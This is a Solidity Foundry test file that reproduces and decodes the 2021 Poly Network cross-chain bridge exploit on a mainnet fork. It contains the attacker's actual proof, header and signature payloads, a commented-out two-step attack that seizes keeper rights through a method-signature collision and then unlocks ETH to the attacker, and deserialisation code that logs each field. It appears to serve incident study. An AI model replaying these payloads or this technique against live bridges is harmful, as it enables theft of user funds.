// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {ECCUtils} from '../../interfaces/PolyNetworkLibraries/ETHCrossChainUtils.sol';
import {ZeroCopySource} from '../../interfaces/PolyNetworkLibraries/ZeroCopySource.sol';
import {ZeroCopySink} from '../../interfaces/PolyNetworkLibraries/ZeroCopySink.sol';

interface IEthCrossChainManager {
    function verifyHeaderAndExecuteTx(
        bytes memory proof, 
        bytes memory rawHeader, 
        bytes memory headerProof, 
        bytes memory curRawHeader,
        bytes memory headerSig
    ) external returns (bool);
}

struct TxArgs {
    bytes toAssetHash;
    bytes toAddress;
    uint256 amount;
}

contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
    IEthCrossChainManager internal bridge = IEthCrossChainManager(0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270);
    address internal attacker = 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963;

    function setUp() external {
        cheat.createSelectFork("mainnet", 12996658);
        // We use the actual attacker address here to reuse their signed message
        // A possible improvement is to reverse-engineer their payload, and create
        // logic that rebuilds the payload to be able to modify it and set
        // an arbitrary address
        updateBalanceTracker(attacker);
    }

/* We will not run the attack now

    function test_attack() external {
        uint256 balanceBefore = attacker.balance;
        // First, let's make ourselves owners
        bytes memory proof = hex'af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d';
        bytes memory rawHeader = hex'0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000';
        bytes memory headerSig = hex'7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000';

        bridge.verifyHeaderAndExecuteTx(proof, rawHeader, '', '', headerSig);

        // Then, we can execute whatever we want, as we are always authorized!
        logBalancesWithLabel('Attacker before', attacker);
        bridge.verifyHeaderAndExecuteTx({
            proof: hex"b12094821f19c671e4c557c358d0780bd2030f3c909df3cb6933607077b9e57d89bd0a00000000000000010001001434d4a23a1fc0c694f0d74ddaf9d8d564cfe2d430020000000000000014250e76987d838a75310c34bf422ea9f1ac4cc90606756e6c6f636b4a14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000", 
            // toContract: AssetProxy
            // method: 756e6c6f636b
            // args: 14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000
            // struct TxArgs {
            //     bytes toAssetHash; 0000000000000000000000000000000000000000 // eth
            //     bytes toAddress; C8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963
            //     uint256 amount; 2662f145d8d496e79a0000000000000000000000000000000000000000000000 // 2857486346845890372134
            // }
            rawHeader: hex"00000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000afc014478ad573eaa072aaf625f990b01b1f0733b6070d2e38770f74c4d5fac900000000000000000000000000000000000000000000000000000000000000000000000000ca9a3b020000000000000001000000000000000000000000000000000000000000000000000000000000000000", 
            headerProof: hex"", 
            curRawHeader: hex"", 
            headerSig: hex"0c6539f57b9bd2138b003744d9bd94375111bd0137525073b5b3967b7089d98f47236cea76488260b74cb587dbbeb7c5f35a056a5cf5b63649cd90ff487f386401"
        });
        logBalancesWithLabel('Attacker after', attacker);
        uint256 balanceAfter = attacker.balance;
        assertGe(balanceAfter, balanceBefore);
    }
*/

    function test_parsedata1() external {
        bytes memory proof = hex'af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d';
        bytes memory rawHeader = hex'0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000';
        //bytes memory headerSig = hex'7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000';
        ECCUtils.Header memory header;
        ECCUtils.ToMerkleValue memory toMerkleValue;
        uint64 crossChainId;

        bytes memory rawHeader2 = encodeHeader1(
                0, // version
                0, // chainId
                0x8446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708, // prevBlockHash
                0xd38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a, // transactionsRoot
                0x773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717, // crossStatesRoot - to verify inclusion
                0xf3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834b, // blockRoot
                uint32(1628587975), // Aug 10 2021, 6:32:55AM
                uint32(11025028), // height
                uint64(6968744985048139056), // consensus data
                hex'7b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d', // consensusPayload
                0 // nextBookkeeper
            );

        emit log_named_bytes("[1] Original header", rawHeader);
        emit log_named_bytes("[2] Encoded header", rawHeader2);

        Exploit_PolyNetwork_Deserializer deserializer = new Exploit_PolyNetwork_Deserializer();

        header = deserializer.deserializeHeader(rawHeader);
        toMerkleValue = deserializer.deseralizeProof(proof, header);


        bytes memory toMerkleValue2 = encodeTx1(
            toMerkleValue.txHash,
            toMerkleValue.fromChainID,
            toMerkleValue.makeTxParam.txHash,
            toMerkleValue.makeTxParam.crossChainId,
            toMerkleValue.makeTxParam.fromContract,
            toMerkleValue.makeTxParam.toChainId,
            toMerkleValue.makeTxParam.toContract,
            toMerkleValue.makeTxParam.method,
            toMerkleValue.makeTxParam.args
        );
        bytes memory toMerkleValueBs = ECCUtils.merkleProve(proof, header.crossStatesRoot);

        console.log("");
        emit log_named_bytes("[1] Original merkle value", toMerkleValueBs);
        emit log_named_bytes("[2] Encoded merkle value", toMerkleValue2);
        console.log("");

        // Header
        console.log(" == HEADER ==");
        console.log("Header version:", header.version);
        console.log("Header chainID:", header.chainId);
        console.log("Header prevBlockHash");
        console.logBytes32(header.prevBlockHash);
        console.log("Header transactionsRoot");
        console.logBytes32(header.transactionsRoot);
        console.log("Header crossStatesRoot");
        console.logBytes32(header.crossStatesRoot);
        console.log("Header blockRoot");
        console.logBytes32(header.blockRoot);
        console.log("Header timestamp:", header.timestamp);
        console.log("Header height:", header.height);
        console.log("Header consensusData:", header.consensusData);
        emit log_named_bytes("Header consensusPayload", header.consensusPayload);
        console.log("Header nextBookkeeper");
        console.logBytes32(header.nextBookkeeper);

        // Transactions
        console.log("");
        console.log(" == TRANSACTIONS ==");
        console.log("From chain ID:", toMerkleValue.fromChainID);
        emit log_named_bytes("Cross chain tx hash", toMerkleValue.txHash);

        emit log_named_bytes("Source chain tx hash", toMerkleValue.makeTxParam.txHash);
        (crossChainId, ) = ZeroCopySource.NextUint64(toMerkleValue.makeTxParam.crossChainId, 0);
        console.log("Cross chain ID:", crossChainId);
        emit log_named_bytes("From contract", toMerkleValue.makeTxParam.fromContract);
        console.log("To chain ID:", toMerkleValue.makeTxParam.toChainId);
        emit log_named_bytes("To contract", toMerkleValue.makeTxParam.toContract);

        emit log_named_bytes("Method ASCII encoded", toMerkleValue.makeTxParam.method);
        bytes4 _methodId = bytes4(keccak256(abi.encodePacked(toMerkleValue.makeTxParam.method, "(bytes,bytes,uint64)")));
        console.log("Method ID");
        console.logBytes4(_methodId);

        emit log_named_bytes("Args", toMerkleValue.makeTxParam.args);

    }

    function encodeHeader1(
        uint32 version,
        uint64 chainId,
        bytes32 prevBlockHash,
        bytes32 transactionsRoot,
        bytes32 crossStatesRoot,
        bytes32 blockRoot,
        uint32 timestamp,
        uint32 height,
        uint64 consensusData,
        bytes memory consensusPayload,
        bytes20 nextBookkeeper) internal returns (bytes memory) {

        bytes memory _header = abi.encodePacked(
            version,
            chainId,
            prevBlockHash,
            transactionsRoot,
            crossStatesRoot,
            blockRoot,
            timestamp,
            height,
            consensusData,
            consensusPayload,
            nextBookkeeper
        );
        return _header;
    }

    function encodeTx1(
        bytes memory txHash,
        uint64 fromChainID,
        bytes memory paramTxHash,
        bytes memory crossChainId,
        bytes memory fromContract,
        uint64 toChainId,
        bytes memory toContract,
        bytes memory method,
        bytes memory args) internal returns (bytes memory) {

        bytes memory _tx = abi.encodePacked(
            txHash,
            fromChainID,
            paramTxHash,
            crossChainId,
            fromContract,
            toChainId,
            toContract,
            method,
            args
        );
        return _tx;
    }


/*  Not in use from here on

    function encode_tx1() internal returns (bytes memory) {
        ECCUtils.ToMerkleValue memory tx;
        TxArgs memory txArgs;

        tx.fromChainID = 3;
        // VerifyHeaderAndExecuteTxEvent(tx.makeTxParam.toContract, tx.txHash, tx.makeTxParam.txHash)
        tx.txHash = hex'80cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a'; // cross-chain tx hash
        tx.makeTxParam.txHash = hex'0c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f7'; // source-chain tx hash
        tx.makeTxParam.crossChainId = hex'31ea'; // 12778
        tx.makeTxParam.fromContract = hex'e1a18842891f8e82a5e6e5ad0a06d8448fe2f407';
        tx.makeTxParam.toChainId = 2; // ETH mainnet
        tx.makeTxParam.toContract = hex'cf2afe102057ba5c16f899271045a0a37fcb10f2'; // https://etherscan.io/address/0xcf2afe102057ba5c16f899271045a0a37fcb10f2
        tx.makeTxParam.method = "f1121318093"; // sighash('f1121318093(bytes,bytes,uint64)') <-> sighash'putCurEpochConPubKeyBytes(bytes)'  
        tx.makeTxParam.args = hex'010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b'; // attacker pub key

    }

    function parsedata2() external {
        bytes memory proof = hex'b12094821f19c671e4c557c358d0780bd2030f3c909df3cb6933607077b9e57d89bd0a00000000000000010001001434d4a23a1fc0c694f0d74ddaf9d8d564cfe2d430020000000000000014250e76987d838a75310c34bf422ea9f1ac4cc90606756e6c6f636b4a14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000';
        bytes memory rawHeader = hex'00000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000afc014478ad573eaa072aaf625f990b01b1f0733b6070d2e38770f74c4d5fac900000000000000000000000000000000000000000000000000000000000000000000000000ca9a3b020000000000000001000000000000000000000000000000000000000000000000000000000000000000';
        //bytes memory headerSig = hex'0c6539f57b9bd2138b003744d9bd94375111bd0137525073b5b3967b7089d98f47236cea76488260b74cb587dbbeb7c5f35a056a5cf5b63649cd90ff487f386401';
        ECCUtils.Header memory header;
        ECCUtils.ToMerkleValue memory toMerkleValue;
        TxArgs memory txArgs;

        Exploit_PolyNetwork_Deserializer deserializer = new Exploit_PolyNetwork_Deserializer();
    
        header = deserializer.deserializeHeader(rawHeader);
        toMerkleValue = deserializer.deseralizeProof(proof, header);

        // Header
        console.log("Header version:", header.version);
        console.log("Header chainID:", header.chainId);
        console.log("Header prevBlockHash");
        console.logBytes32(header.prevBlockHash);
        console.log("Header transactionsRoot");
        console.logBytes32(header.transactionsRoot);
        console.log("Header crossStatesRoot");
        console.logBytes32(header.crossStatesRoot);
        console.log("Header blockRoot");
        console.logBytes32(header.blockRoot);
        console.log("Header timestamp:", header.timestamp);
        console.log("Header height:", header.height);
        console.log("Header consensusData:", header.consensusData);
        emit log_named_bytes("Header consensusPayload", header.consensusPayload);
        console.log("Header nextBookkeeper");
        console.logBytes32(header.nextBookkeeper);

        // Transactions
        console.log("");
        console.log("From chain ID:", toMerkleValue.fromChainID);
        emit log_named_bytes("Cross chain tx hash", toMerkleValue.txHash);

        emit log_named_bytes("Source chain tx hash", toMerkleValue.makeTxParam.txHash);
        emit log_named_bytes("Cross chain ID", toMerkleValue.makeTxParam.crossChainId);
        emit log_named_bytes("From contract", toMerkleValue.makeTxParam.fromContract);
        console.log("To chain ID:", toMerkleValue.makeTxParam.toChainId);
        emit log_named_bytes("To contract", toMerkleValue.makeTxParam.toContract);

        emit log_named_bytes("Method ASCII encoded", toMerkleValue.makeTxParam.method);
        bytes4 _methodId = bytes4(keccak256(abi.encodePacked(toMerkleValue.makeTxParam.method, "(bytes,bytes,uint64)")));
        console.log("Method ID");
        console.logBytes4(_methodId);

        emit log_named_bytes("Args", toMerkleValue.makeTxParam.args);
        txArgs = deserializer.deserializeTxArgs(toMerkleValue.makeTxParam.args);
        emit log_named_bytes("Tx args.toAssetHash", txArgs.toAssetHash);
        emit log_named_bytes("Tx args.toAddress", txArgs.toAddress);
        console.log("Tx args.amount: ", txArgs.amount);
    }
*/
}

contract Exploit_PolyNetwork_Deserializer is TestHarness {

    function deseralizeProof(bytes memory _proof, ECCUtils.Header memory _header) public pure returns(ECCUtils.ToMerkleValue memory) {
        ECCUtils.ToMerkleValue memory toMerkleValue;
        bytes memory toMerkleValueBs;

        toMerkleValueBs = ECCUtils.merkleProve(_proof, _header.crossStatesRoot);
        toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);
        return toMerkleValue;
    }

    function deserializeHeader(bytes memory _header) public pure returns(ECCUtils.Header memory) {
        ECCUtils.Header memory header = ECCUtils.deserializeHeader(_header);
        return header;
    }

    function deserializeTxArgs(bytes memory valueBs) public pure returns (TxArgs memory) {
        TxArgs memory args;
        uint256 off = 0;
        (args.toAssetHash, off) = ZeroCopySource.NextVarBytes(valueBs, off);
        (args.toAddress, off) = ZeroCopySource.NextVarBytes(valueBs, off);
        (args.amount, off) = ZeroCopySource.NextUint255(valueBs, off);
        return args;
    }
}

contract Exploit_PolyNetwork_Serializer is TestHarness {
    
    function serializeTxArgs(TxArgs memory args) public pure returns (bytes memory) {
        bytes memory buff;
        buff = abi.encodePacked(
            ZeroCopySink.WriteVarBytes(args.toAssetHash),
            ZeroCopySink.WriteVarBytes(args.toAddress),
            ZeroCopySink.WriteUint255(args.amount)
            );
        return buff;
    }
}
